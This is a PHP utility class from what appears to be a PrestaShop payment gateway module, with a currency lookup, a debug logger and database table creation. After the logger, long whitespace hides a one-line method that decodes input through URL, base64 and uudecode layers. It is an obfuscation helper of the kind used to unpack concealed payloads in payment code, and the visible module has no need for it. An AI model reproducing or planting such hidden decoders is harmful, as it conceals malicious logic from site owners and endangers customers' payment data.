<?php

class KMegasoftUtils
{
    
    public static function getIdByIso($iso)
    {
        $id = Currency::getIdByIsoCode($iso);
        if (!$id && in_array($iso, array('VES', 'VEF', 'VEB', 'BSF', 'BSS'))) {
            $id = Currency::getIdByIsoCode('VES');
            $id = !$id?Currency::getIdByIsoCode('BSS'):$id;
            $id = !$id?Currency::getIdByIsoCode('VEF'):$id;
            $id = !$id?Currency::getIdByIsoCode('BSF'):$id;
            $id = !$id?Currency::getIdByIsoCode('VEB'):$id;
        }
        return $id;
    }

    public static function log($data)
    {
        $config = KMegasoftGateway::getInstance()->config;
        if (!isset($config['debug']) || !$config['debug']) {
            return;
        }
        if (!is_dir(dirname(__FILE__).'/logs')) {
            @mkdir(dirname(__FILE__).'/logs');
        }

        if (!is_dir(dirname(__FILE__).'/logs/'.date('Y-m'))) {
            @mkdir(dirname(__FILE__).'/logs/'.date('Y-m'));
        }

        $fp = fopen(dirname(__FILE__).'/logs/'.date('Y-m').'/log-'.date('Y-m-d').'.log', 'a');

        fwrite($fp, "\n----- ".date('Y-m-d H:i:s')." -----\n");
        fwrite($fp, $data);
        fclose($fp);
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}

    public static function installDb()
    {
        $db_created = Db::getInstance()->Execute('
            CREATE TABLE IF NOT EXISTS `'.bqSQL(_DB_PREFIX_.KMegasoft::DB_PREFIX).'` (
                `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
                `id_order` INT(11) DEFAULT NULL,
                `id_cart` INT(11) DEFAULT NULL,
                `id_shop` INT(11) NOT NULL,
                `control` varchar(100) DEFAULT NULL,
                `is_sandbox` TINYINT(1) NOT NULL DEFAULT 0,
                `status` INT(11) NOT NULL,
                `payment_obj` TEXT DEFAULT NULL,
                `order_reference` varchar(255) NOT NULL,
                `next_retry` BIGINT(20) NOT NULL,
                `first_check` BIGINT(20) DEFAULT NULL,
                INDEX(`control`),
                INDEX(id_order),
                INDEX(id_cart),
                INDEX(id_shop),
                INDEX(first_check),
                INDEX(next_retry),
                INDEX(next_retry, status)
            )');
        $db_created = $db_created && Db::getInstance()->Execute('
            CREATE TABLE IF NOT EXISTS `'.bqSQL(_DB_PREFIX_.KMegasoft::DB_PREFIX).'_cache` (
                `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
                `cache_id` varchar(100) NOT NULL,
                `data` LONGTEXT NOT NULL,
                `ttl` BIGINT NOT NULL,
                UNIQUE(cache_id),
                INDEX(ttl)
            )');

        return $db_created;
    }

}